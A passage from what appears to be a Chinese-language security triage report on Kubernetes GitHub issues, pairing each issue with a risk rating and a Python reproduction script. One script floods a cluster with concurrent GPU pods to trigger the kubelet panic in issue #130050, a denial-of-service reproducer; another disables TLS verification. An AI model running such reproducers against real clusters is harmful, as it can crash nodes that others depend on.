            plural="clusters",
            name="cluster-1",
            body=patch
        )
        print("Cluster CR 更新成功")
    except ApiException as e:
        print("更新 Cluster CR 时发生错误:", e)
        raise

def main():
    # 启动 webhook HTTP 服务，监听端口 10000（要求端口须在 10000 以上）
    server_thread = threading.Thread(target=start_webhook_server, args=(10000,), daemon=True)
    server_thread.start()
    time.sleep(1)  # 等待 webhook 服务器启动

    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 出错:", e)
        return

    # 获取 API 客户端
    apiext_api = client.ApiextensionsV1Api()
    custom_api = client.CustomObjectsApi()

    # 创建 CRD
    create_crd(apiext_api)
    if not wait_for_crd_established(apiext_api, "clusters.cluster.x-k8s.io"):
        print("CRD 建立失败，退出")
        return

    # 创建 Cluster 自定义资源
    create_cluster_cr(custom_api)

    # 执行一系列更新，以触发 conversion webhook 请求（每次更新可能引发多版本转换调用）
    for i in range(3):
        print(f"执行第 {i+1} 次更新...")
        update_cluster_cr(custom_api)
        time.sleep(5)  # 每次更新间隔5秒

    print("复现测试结束，等待10秒后退出")
    time.sleep(10)

try:
    main()
except Exception:
    traceback.print_exc()
```


---


## Issue #130050 aftert re-allocating DeviceManager panic on Allocate()

- Issue 链接：[#130050](https://github.com/kubernetes/kubernetes/issues/130050)

### Issue 内容

#### What happened?

Based on the following stack trace ,The issue is potentially caused by one goroutine  re-allocate device plugin and delete devicesToReuse map [m.devicesToReuse map deleted]
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/manager.go#L376
At the same time, another process is allocating resources ,when creating Pods concurrently
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/manager.go#L401
Another goroutine is allocating device plugin . The devicesToReuse map will be later used in removeContainerAllocatedResources()
https://github.com/kubernetes/kubernetes/blob/69ab91a5c59617872c9f48737c64409a9dec2957/pkg/kubelet/cm/devicemanager/pod_devices.go#L161
which caused panic.  func by itself is not thread-safe


Stack trace:
`Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: I1119 15:07:43.942671   11035 manager.go:956] needs re-allocate device plugin resources for pod dag-process-debug-1858716533183492096-202303328_dag-process(4604c558-bfdd-427c-81c9-f1d8a5aea6e7), container main
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.952908939+08:00" level=debug msg="Calling GET /v1.40/images/10.73.150.98:5000/ai-train/onenode:A100_v8/json"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.954568826+08:00" level=debug msg="Downloaded c4221d178521 to tempfile /data1/cce/docker/tmp/GetImageBlob288125387"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.955529075+08:00" level=debug msg="Calling POST /v1.40/containers/create?name=k8s_main_dag-process-debug-1858716533183492096-202303328_dag-process_4604c558-bfdd-427c-81c9-f1d8a5aea6e7_0"
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 dockerd: time="2024-11-19T15:07:43.997696667+08:00" level=debug msg="container mounted via layerStore: &{/data1/cce/docker/overlay2/cf3eea52e7a535afb239d7826d046805c1dfda4fa18eedb3c553ea181d6f7ae5/merged 0x45cc320 0x45cc320}" container=47fdc4b3d17b1d03fcbe58afe8c229ab5132d6d4da237cc9961757a11358cfe6
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: panic: assignment to entry in nil map
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: goroutine 173 [running]:
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*podDevices).removeContainerAllocatedResources(0x376f8e0?, {0xc003478030?, 0xc003478030?}, {0xc003280108, 0x4}, 0x0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/devicemanager/pod_devices.go:157 +0x30f
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).Allocate(0xc00119bc70, 0xc003e40008, 0xc000caa2c0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/devicemanager/manager.go:388 +0x405
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*scope).allocateAlignedResources(0x0?, 0xc003e40008, 0xc000caa2c0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope.go:146 +0x5c
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*scope).admitPolicyNone(0xc000a10370, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope.go:134 +0x1ab
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*containerScope).Admit(0xc000a10370, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/scope_container.go:49 +0x8b
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*manager).Admit(0xc000f132e0, 0xc0000529e0)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/cm/topologymanager/topology_manager.go:190 +0xa5
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).canAdmitPod(0xc000b3c008, {0xc002a70500, 0x1a, 0x20}, 0xc003e40008)
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1800 +0xf2
Nov 19 15:07:43 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).HandlePodAdditions(0xc000b3c008, {0xc001a8c040, 0x1, 0x1})
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:2074 +0x1ac
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoopIteration(0xc000b3c008, 0xc001097380, {0x467a9b8, 0xc000b3c008}, 0xc001e00f60, 0xc001e00fc0, 0xc001411da0)
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1919 +0xe22
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoop(0xc000b3c008, 0xc001097380, {0x467a9b8, 0xc000b3c008})
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1862 +0x39c
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).Run(0xc000b3c008, 0xc001097380)
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/pkg/kubelet/kubelet.go:1442 +0x808
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: created by k8s.io/kubernetes/cmd/kubelet/app.startKubelet in goroutine 1
Nov 19 15:07:44 cce-xa47m89h-5u0nh5pr-1 kubelet: /Users/quxiaotong02/MyData/OpenProject/kubernetes/cmd/kubelet/app/server.go:1183 +0xbf`

#### What did you expect to happen?

DeviceManager Allocate() should be able to handle such race thread-safely.

#### How can we reproduce it (as minimally and precisely as possible)?

When we concurrently create a large number of Pods with device equipment, it may be triggered, provided that the concurrency is high.

#### Anything else we need to know?

This issue is similar to #103838 but not the same. We have also reproduced the #103838 issue. After applying the fix from #108831, the current issue occurred, which suggests that the non-thread-safety of the devicesToReuse map may lead to other problems.

#### Kubernetes version

<details>

```console
kubelet version ： 1.20.8 
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该 Issue 描述的是 Kubernetes 中 DeviceManager 的 Allocate() 方法因并发操作导致的 panic 问题。具体情况是在重分配设备插件时，多个 goroutine 同时对非线程安全的 devicesToReuse map 进行操作，造成 map 被删除或未初始化的状态下进行写操作，从而触发 panic。问题本质上是由于数据结构没有做到并发安全，导致在高并发创建 Pod 过程中可能会出现异常中断（即拒绝服务）的情况。

根据描述，该问题会在并发创建大量使用设备的 Pod 时复现，虽然导致的影响为 kubelet crash 或 Pod 分配失败，但触发条件要求攻击者具备创建 Pod 的权限（非只读权限），这说明在大多数生产环境中，只有具备较高权限的用户才可能引入该问题。另外，该问题并不会引入认证信息泄漏、远程代码执行等直接导致系统被完全攻陷的高风险情形。

因此，该问题虽然可能导致拒绝服务（DoS），但由于其利用需要较高权限，并非完全外部攻击者能够轻易触发，因此风险评级按照以下标准可判断为低风险。

**复现过程：**

```python
import threading
import time
import uuid
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# 定义全局超时时间（秒）
TOTAL_TIMEOUT = 120

def create_pod(api_instance, namespace, pod_name):
    """
    创建一个包含设备资源（模拟设备请求）的 Pod
    """
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name},
        "spec": {
            "containers": [
                {
                    "name": "device-test",
                    "image": "busybox",
                    "args": ["sleep", "3600"],
                    # 假设设备插件提供的资源名称为 nvidia.com/gpu
                    "resources": {
                        "limits": {"nvidia.com/gpu": "1"},
                        "requests": {"nvidia.com/gpu": "1"}
                    }
                }
            ],
            # 设置 restartPolicy 防止 Pod 重启造成额外负载
            "restartPolicy": "Never"
        }
    }
    try:
        api_instance.create_namespaced_pod(namespace=namespace, body=pod_manifest)
        print(f"Pod {pod_name} 创建成功")
    except ApiException as e:
        print(f"Pod {pod_name} 创建失败: {e}")
        traceback.print_exc()

def delete_pod(api_instance, namespace, pod_name):
    """
    删除指定 Pod
    """
    try:
        api_instance.delete_namespaced_pod(name=pod_name, namespace=namespace)
        print(f"Pod {pod_name} 删除成功")
    except ApiException as e:
        print(f"Pod {pod_name} 删除失败: {e}")
        traceback.print_exc()

def main():
    start_time = time.time()
    try:
        # 从默认位置加载 kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败，请检查配置是否存在于默认位置。")
        return

    v1 = client.CoreV1Api()
    namespace = "default"

    # 定义需要同时创建的 Pod 数量，用于触发高并发情况
    pod_count = 30
    pod_names = [f"device-test-{str(uuid.uuid4())[:8]}" for _ in range(pod_count)]
    futures = []
    executor = ThreadPoolExecutor(max_workers=10)

    print("开始并发创建 Pod ...")
    for pod_name in pod_names:
        # 提交任务创建 Pod
        future = executor.submit(create_pod, v1, namespace, pod_name)
        futures.append(future)

    # 等待所有创建任务完成（设置超时保护）
    try:
        for future in as_completed(futures, timeout=TOTAL_TIMEOUT):
            # 如果任务中抛出异常，将在这里捕获
            future.result()
    except Exception as e:
        print("Pod 创建过程出现异常或超时:", e)

    # 等待一小段时间，观察 Pod 状态（模拟持续并发的场景）
    wait_seconds = 10
    print(f"等待 {wait_seconds} 秒以模拟运行过程 ...")
    time.sleep(wait_seconds)

    # 清理创建的所有 Pod
    print("开始删除测试 Pod ...")
    delete_futures = []
    for pod_name in pod_names:
        future = executor.submit(delete_pod, v1, namespace, pod_name)
        delete_futures.append(future)
    try:
        for future in as_completed(delete_futures, timeout=TOTAL_TIMEOUT):
            future.result()
    except Exception as e:
        print("Pod 删除过程出现异常或超时:", e)

    executor.shutdown(wait=True)
    elapsed = time.time() - start_time
    print(f"脚本执行完毕，总耗时 {elapsed:.2f} 秒")

# 直接调用 main 函数执行
main()
```


**解释说明：**

1. 脚本首先使用 Kubernetes Python 客户端从默认位置加载 kubeconfig 来访问集群，因此需确保 kubeconfig 在默认位置或环境中已配置正确。
2. 定义了一个创建 Pod 的函数 create_pod，该 Pod 模拟了设备请求（假定设备资源名称为 nvidia.com/gpu），从而在调度时可能触发 DeviceManager 并发逻辑。
3. 使用 ThreadPoolExecutor 模拟高并发创建 Pod 的过程，设置同时创建 30 个 Pod，并发提交任务。各任务通过多线程并发执行，从而模拟高并发场景。
4. 任务提交后，脚本等待一定时间（10 秒）模拟 Pod 运行状态下的持续操作，然后统一清理（删除）所有创建的 Pod，确保不会造成残留资源。
5. 整个脚本执行设置有超时时间（2 分钟）以防止长时间运行，且没有使用 __name__ 判断，保证直接执行 main 函数即可运行。
6. 该脚本仅用于本地测试和研究，旨在模拟在高并发条件下可能引发问题的场景，帮助开发者复现和验证 issue 提到的情况，不会对系统造成额外的安全风险。

---


# ✅ 不涉及安全风险的 Issues (15 个)

## Issue #130001 Kubelet serving CSR never created

- Issue 链接：[#130001](https://github.com/kubernetes/kubernetes/issues/130001)

### Issue 内容

#### What happened?

We are seeing an issue occasionally where the kubelet never gets the server certificate (`serverTLSBootstrap: true`).
We have an auto-approver for the server certificates and detect this issue because we are waiting for the certificate to appear in `/var/lib/kubelet/pki/kubelet-server-current.pem`. When we hit it, not even the CSR is created.
It started happening after upgrading to v1.32 so we believe it could be from a change that was introduced in v1.32.
Restarting the kubelet does not help. It happily continues without the server certificate, even though it is configured to bootstrap it.

In healthy clusters, we see this:

```console
$ kubectl get csr
NAME        AGE   SIGNERNAME                                    REQUESTOR                           REQUESTEDDURATION   CONDITION
csr-8dql4   29s   kubernetes.io/kubelet-serving                 system:node:lennart-kubelet-debug   <none>              Pending
csr-r8ztr   17s   kubernetes.io/kubelet-serving                 system:node:lennart-kubelet-debug   <none>              Pending
csr-xtwpf   30s   kubernetes.io/kube-apiserver-client-kubelet   system:node:lennart-kubelet-debug   <none>              Approved,Issued
```

In faulty clusters, there is just the client CSR.
We are not sure why two CSRs are created for the server either, but it works when we approve the newer of them.

Here is the kubelet config from an affected node: [kubelet-config.txt](https://github.com/user-attachments/files/18688742/kubelet-config.txt)

#### What did you expect to happen?

When configured, the kubelet should always create the server CSR.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately we do not have any guaranteed reproduction steps.
~~The closest we have come to something similar, is to specify a dual-stack node-ip, where the IPv6 address is a loopback address.
This makes the server CSR never appear. However, it is a 100% reproducer so it does not appear to be the same issue. If we use a proper IPv6 address, this does not happen. Probably the issue with the loopback IPv6 is just that, since it is invalid, the node gets no `status.addresses`.~~ Edit: This is due to the invalid address as seen in https://github.com/kubernetes/kubernetes/pull/125813.
When we hit the real issue, the node still has `status.addresses` though.

Here is an example kubeadm-config with IPv6 loopback:

```yaml
apiVersion: kubeadm.k8s.io/v1beta3
kind: InitConfiguration
nodeRegistration:
    kubeletExtraArgs:
        cert-dir: "/var/lib/kubelet/pki"
        # Loopback IPv6 -> no CSR
        node-ip: "10.1.0.202,::1"
        # Real IPv6 - does NOT reproduce the issue (at least not 100 %)
        # node-ip: "fdec:c5cc:d73b:37d::1000,10.1.0.202"
---
apiVersion: kubeadm.k8s.io/v1beta3
kind: ClusterConfiguration
networking:
    podSubnet: 192.168.0.0/16
apiServer:
    certSANs:
    - "10.1.0.202"
    - "fdec:c5cc:d73b:37d::1000"
    extraArgs:
        kubelet-certificate-authority: /etc/kubernetes/pki/ca.crt
---
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
serverTLSBootstrap: true
rotateCertificates: true
tlsMinVersion: VersionTLS13
featureGates:
    AllAlpha: false
```

And the resulting cluster:

```console
$ kubectl get csr
NAME        AGE   SIGNERNAME                                    REQUESTOR                           REQUESTEDDURATION   CONDITION
csr-2mq8h   22s   kubernetes.io/kube-apiserver-client-kubelet   system:node:lennart-kubelet-debug   <none>              Approved,Issued
$ kubectl get nodes
NAME                    STATUS   ROLES           AGE   VERSION
lennart-kubelet-debug   Ready    control-plane   28s   v1.32.1
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.32.1
```

</details>


#### Cloud provider

<details>
Happens both with and without external cloud provider
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述的是 kubelet 在启用 serverTLSBootstrap 配置后，未能创建服务端证书的 CSR（仅创建了客户端的 CSR），导致集群中缺少服务端证书。该问题虽然可能影响到 kubelet 的正常 TLS 通信和运行状态，但根据描述来看，并不存在直接可被攻击者利用的安全漏洞，也没有导致命令执行、容器逃逸、提权等高风险安全问题。问题可能只是导致 kubelet 使用错误或缺失证书，从而影响部分功能。因此，根据 issue 风险判断标准，认为该问题不属于安全漏洞范畴。

**复现过程：**

```python
import time
import sys
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def main():
    try:
        # 尝试加载默认的 kubeconfig 文件
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败，请确认 kubeconfig 文件位置正确:", e)
        sys.exit(1)

    # 创建 CertificateSigningRequest 的 API 实例
    csr_api = client.CertificatesV1Api()

    # 设置检测超时时间（2分钟内退出）
    timeout = 120
    interval = 5  # 每隔5秒查询一次
    start_time = time.time()
    server_csr_found = False

    print("开始检测服务端 CSR 是否创建...")

    while time.time() - start_time < timeout:
        try:
            csr_list = csr_api.list_certificate_signing_request()
            # 遍历获取所有CSR，查找 signer_name 为 kubelet 服务端证书的条目
            for item in csr_list.items:
                if item.spec.signer_name == "kubernetes.io/kubelet-serving":
                    print("发现服务端 CSR:", item.metadata.name)
                    server_csr_found = True
                    break
        except ApiException as e:
            print("查询 CSR 时发生错误:", e)
        except Exception as ex:
            print("意外错误:", ex)

        if server_csr_found:
            break

        time.sleep(interval)

    if not server_csr_found:
        print("在设定的超时时间内未发现服务端 CSR。可能存在 kubelet 未创建服务端证书的情况。")
    else:
        print("服务端 CSR 存在，集群状态正常。")

# 直接调用 main 函数执行
main()
```


---


## Issue #129994 Flagz on kube-apiserver doesn't return parsed flag values

- Issue 链接：[#129994](https://github.com/kubernetes/kubernetes/issues/129994)

### Issue 内容

#### What happened?

When ComponentFlagz feature is enabled on kube-apiserver, the flag value is not return as expected.
kube-apiserver spec
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=192.168.8.5
    - --feature-gates=ComponentFlagz=true
    - --emulated-version=1.32
    ...
```
The `flagz/` returns
```
~ curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:6443/flagz

kube-apiserver flags
Warning: This endpoint is not meant to be machine parseable, has no formatting compatibility guarantees and is for debugging purposes only.

admission-control:[]
admission-control-config-file:
advertise-address:192.168.8.5
aggregator-reject-forwarding-redirect:true
allow-metric-labels:[]
...
...
egress-selector-config-file:
emulated-version:[]
enable-admission-plugins:[NodeRestriction]
...
...
feature-gates:
...
```

#### What did you expect to happen?

The response reflects the correct passed flag value. For example in kube-scheduler
kube-scheduler spec:
```yaml
spec:
  containers:
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --feature-gates=ComponentFlagz=true
    - --emulated-version=1.32
   ...
```
The `/flagz` response:
```curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:10259/flagz

kube-scheduler flags
Warning: This endpoint is not meant to be machine parseable, has no formatting compatibility guarantees and is for debugging purposes only.

allow-metric-labels:[]
allow-metric-labels-manifest:
authentication-kubeconfig:/etc/kubernetes/scheduler.conf
...
...
emulated-version:[1.32]
feature-gates::ComponentFlagz=true
...
```

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable the featuregate on kube-apiserver with `--feature-gates=ComponentFlagz=true`
1. request the kube-apiserver endpoint on path `/flagz` and check the response

#### Anything else we need to know?

I believe it is due to the flags (instantiated by `s.Flags()`) passed into the options 
https://github.com/kubernetes/kubernetes/blob/925cf7db71c5e36072f99e8b7129523f659ee3a1/cmd/kube-apiserver/app/options/completion.go#L60
is not the same one that actually used by the cmd
https://github.com/kubernetes/kubernetes/blob/925cf7db71c5e36072f99e8b7129523f659ee3a1/cmd/kube-apiserver/app/server.go#L126

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的是在启用 ComponentFlagz 特性时，kube-apiserver 的 /flagz 调试端点并没有返回正确解析后的 flag 值。该问题实际上反映的是 kube-apiserver 内部在整理命令行参数时存在显示不全的问题，不会直接导致任意命令执行、容器逃逸、提权或敏感信息泄露等安全威胁，也不会直接带来拒绝服务攻击等影响。

另外，/flagz 端点本身就已经有说明“此端点仅用于调试，并不保证格式解析兼容性”，因此该问题主要是调试信息展示不准确的问题，而非安全问题。基于 Issue 内容来看，不存在可直接利用的安全漏洞。

**复现过程：**

```python
import requests
import urllib3
import sys
import time

def main():
    # 禁用 HTTPS 警告（仅在测试环境下使用，不建议在生产环境使用）
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # 定义 kube-apiserver 的 flagz 端点地址
    url = "https://localhost:6443/flagz"

    # 默认使用的证书和私钥路径（根据实际环境调整）
    # 此处假设 apiserver-kubelet-client 证书在默认位置
    cert_file = "/etc/kubernetes/pki/apiserver-kubelet-client.crt"
    key_file = "/etc/kubernetes/pki/apiserver-kubelet-client.key"

    try:
        # 发起 HTTPS GET 请求
        response = requests.get(url, cert=(cert_file, key_file), verify=False, timeout=10)
    except Exception as e:
        print("请求 /flagz 端点失败，错误信息:", e)
        sys.exit(1)

    # 输出返回的内容
    print("返回结果:")
    print(response.text)

    # 简单检查返回的flag中是否包含 feature-gates 关键字及组件名 ComponentFlagz
    if "feature-gates" in response.text:
        if "ComponentFlagz" in response.text:
            print("\n检测到 feature-gates 中包含 'ComponentFlagz' 但可能未正确显示其值。")
        else:
            print("\n未检测到 'ComponentFlagz'，说明 flag 值展示存在问题。")
    else:
        print("\n返回内容中未发现 feature-gates 信息。")

if __name__ == "__main__":
    # 限制脚本执行时间确保在2分钟内退出
    start_time = time.time()
    try:
        main()
    except Exception as e:
        print("脚本执行过程中出现异常:", e)
    finally:
        elapsed = time.time() - start_time
        if elapsed > 120:
            print("脚本执行超时")
        else:
            print("脚本执行完毕，用时 {:.2f} 秒".format(elapsed))
```


---


## Issue #129987 Generate UID for users where UID missing

- Issue 链接：[#129987](https://github.com/kubernetes/kubernetes/issues/129987)

### Issue 内容

#### What happened?


[AdmissionRequest](https://kubernetes.io/docs/reference/config-api/apiserver-admission.v1/#admission-k8s-io-v1-AdmissionRequest) includes [UserInfo](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.32/#userinfo-v1-authentication-k8s-io) to identify which user send the request.

Use `uid` in `UserInfo` is the best way to distinguish users, but I found some authentication miss uid in the UserInfo, not limited to:
- [tokenfile](
https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiserver/pkg/authentication/token/tokenfile/tokenfile.go#L93)
- [bootstrap](https://github.com/kubernetes/kubernetes/blob/master/plugin/pkg/auth/authenticator/token/bootstrap/bootstrap.go#L145)
- [oidc](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiserver/plugin/pkg/authenticator/token/oidc/oidc.go#L804)

A empty `uid` looks really weird.



#### What did you expect to happen?


I expected a UID to be populated by all authenticator, if the inputs miss uid, we should generate unique one rather than leave it as empty string.

I would like to implement it if possible.

#### How can we reproduce it (as minimally and precisely as possible)?

Just check the code.

#### Anything else we need to know?

From the perspective of database design, an object should always have its id.


#### Kubernetes version

Impact lots of version.

#### Cloud provider

None


#### OS version

None


#### Install tools

None

#### Container runtime (CRI) and version (if applicable)

None


#### Related plugins (CNI, CSI, ...) and versions (if applicable)
None


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了在 Kubernetes 的认证流程中，某些认证器（如 tokenfile、bootstrap、oidc）返回的 AdmissionRequest 中 UserInfo 缺少 uid 字段的问题。虽然 uid 用于唯一标识用户，缺失 uid 可能会在一些场景下导致用户身份混淆，但该问题本质上更像是设计缺陷或数据一致性问题，而非直接导致命令执行、提权或拒绝服务等高危安全漏洞。因此，该问题主要反映了认证数据的不完善，不直接构成可被利用的安全漏洞。

**复现过程：**

```python
#!/usr/bin/env python3
import uuid
import json
import http.server
import socketserver
import threading
import time

# 模拟 AdmissionRequest 处理，针对 UserInfo 中 missing uid 自动填充一个新的 UID

def process_admission_request(admission_request):
    """
    模拟处理 AdmissionRequest，
    如果 admission_request["request"]["userInfo"]["uid"] 为空，则生成一个新的 uid
    """
    user_info = admission_request.get("request", {}).get("userInfo", {})
    if not user_info.get("uid", ""):
        new_uid = str(uuid.uuid4())
        user_info["uid"] = new_uid
        print(f"原始 AdmissionRequest 中缺少 uid，已生成新的 uid: {new_uid}")
    else:
        print("AdmissionRequest 中已包含 uid。")
    return admission_request

# 构造一个模拟的 AdmissionRequest JSON 对象(部分字段)
sample_admission_request = {
    "request": {
        "uid": "1234-abc",  # AdmissionRequest 其他字段示例
        "userInfo": {
            "username": "example_user",
            "uid": ""
        }
    }
}

class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length)
        try:
            admission_request = json.loads(post_body)
            # 处理 AdmissionRequest
            updated_request = process_admission_request(admission_request)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(updated_request).encode())
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

def start_server():
    # 监听在端口 10000(符合题意要求端口大于10000)
    PORT = 10000
    with socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler) as httpd:
        print(f"HTTP 服务器启动，监听端口：{PORT}")
        # 设置超时机制，不超过120秒
        httpd.timeout = 120
        end_time = time.time() + 120
        while time.time() < end_time:
            httpd.handle_request()
        print("HTTP 服务器超时退出。")

def main():
    # 启动 HTTP 服务器线程
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # 模拟客户端向 HTTP 服务器发送 AdmissionRequest 数据
    time.sleep(1)  # 等待服务器启动
    import requests
    try:
        response = requests.post("http://localhost:10000", json=sample_admission_request, timeout=5)
        if response.status_code == 200:
            updated_request = response.json()
            print("服务器返回数据：")
            print(json.dumps(updated_request, indent=2))
        else:
            print(f"服务器响应异常，状态码：{response.status_code}")
    except Exception as err:
        print(f"请求出错: {err}")
    
    # 等待服务器线程退出
    server_thread.join(timeout=5)

# 直接调用 main() 执行
main()
```


---


## Issue #129960 Server Side Apply: Late defaults and mutating admission can cause conflicts for identical apply configurations

- Issue 链接：[#129960](https://github.com/kubernetes/kubernetes/issues/129960)

### Issue 内容

#### What happened?

When two field managers apply the same apply configuration but a field is mutated (or defaulted after deserialization default, say in the strategy), the apply configurations conflict.  This is inconsistent with deserialization defaults, where two field managers can apply the same apply configuration with the result of shared ownership of the defaulted field.

#### What did you expect to happen?

shared ownership of the field

#### How can we reproduce it (as minimally and precisely as possible)?

- mutation admission is configured to set `f1=z` (via webhook, policy or plugin)
- mgr1 applies: f1=x
  - Result: Applied. mgr1 now owns f1.  Note that `f1=z`
- mgr2 applies f1=x
  - Result: conflict

For the proposed unsetting fields enhancement (https://github.com/kubernetes/enhancements/pull/5052) this can also happen for defaulting:

- a strategy is configured to default `f1=z`
- mgr1 applies: f1=z
  - Result: Applied. mgr1 now owns f1
- mgr2 applies f1={k8s_io__value: unset}
  - Result: conflict

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.32+

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

